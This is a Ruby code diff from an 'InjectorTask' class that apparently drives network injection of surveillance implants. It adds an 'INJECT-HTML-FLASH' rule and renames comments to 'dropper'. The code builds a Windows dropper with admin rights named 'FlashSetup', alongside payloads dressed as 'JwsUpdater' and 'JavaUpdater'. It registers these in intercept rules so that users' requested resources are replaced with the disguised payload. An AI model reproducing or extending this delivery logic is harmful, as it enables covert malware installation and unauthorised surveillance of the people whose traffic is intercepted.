@@ -46,7 +46,7 @@ class InjectorTask
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{factory.ident} #{rule.resource}"
 
           temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-          # generate the applet
+          # generate the dropper
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
                     'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident}
@@ -66,7 +66,7 @@ class InjectorTask
           end
           FileUtils.rm_rf(temp_zip)
 
-        when 'INJECT-HTML'
+        when 'INJECT-HTML-JAVA'
           appname = 'JwsUpdater' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
@@ -94,12 +94,37 @@ class InjectorTask
           end
           FileUtils.rm_rf(temp_zip)
 
+        when 'INJECT-HTML-FLASH'
+          appname = 'FlashSetup' + progressive.to_s
+          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
+
+          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          # generate the dropper
+          params = {'factory' => {'_id' => rule.action_param},
+                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                    'melt' => {'admin' => true, 'appname' => appname}
+                    }
+          build = Build.factory(:windows)
+          build.create params
+          FileUtils.cp build.path(build.outputs.first), temp_zip
+          build.clean
+
+          # extract the zip
+          Zip::ZipFile.open(temp_zip) do |z|
+            z.each do |f|
+              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+              z.extract(f, f_path) unless File.exist?(f_path)
+              vector_files[f.name] = f_path
+            end
+          end
+          FileUtils.rm_rf(temp_zip)
+
         when 'INJECT-UPGRADE'
           appname = 'JavaUpdater' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
           temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-          # generate the applet
+          # generate the upgrade
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['windows'],
                                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
